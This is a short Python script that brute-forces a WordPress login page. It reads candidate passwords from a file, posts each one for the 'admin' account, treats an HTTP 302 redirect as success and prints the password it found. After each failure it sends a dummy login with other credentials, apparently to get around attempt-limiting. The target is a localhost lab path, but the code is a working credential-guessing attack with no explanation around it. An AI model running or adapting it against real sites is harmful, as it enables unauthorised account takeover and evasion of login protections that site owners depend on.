import requests
#import time
#sleep_after_iterations = 2
url = "http://localhost/cybersec/wp-login.php"

# Read passwords from the file
with open("passwords.txt", "r") as file:

    passwords = file.readlines()

# Strip whitespace from each password
passwords = [password.strip() for password in passwords]

# Define the headers correctly
headers = {
    "Cookie": "wordpress_test_cookie=WP%20cookie%20check"
}


# Iterate over the passwords and try each one
for password in passwords:
    data = {
        "log": "admin",
        "pwd": password
    }

    # Send the POST request
    response = requests.post(url, data=data, headers=headers, allow_redirects=False)
    
  
    
    # Check for a successful login (302 indicates a redirect)
    if response.status_code == 302:
        print(f"The password is {password}")
        break 
    elif response.status_code != 302:
        response = requests.post(url, data={"log":"think","pwd":"123"}, headers=headers, allow_redirects=False)
       
        
        
        

      


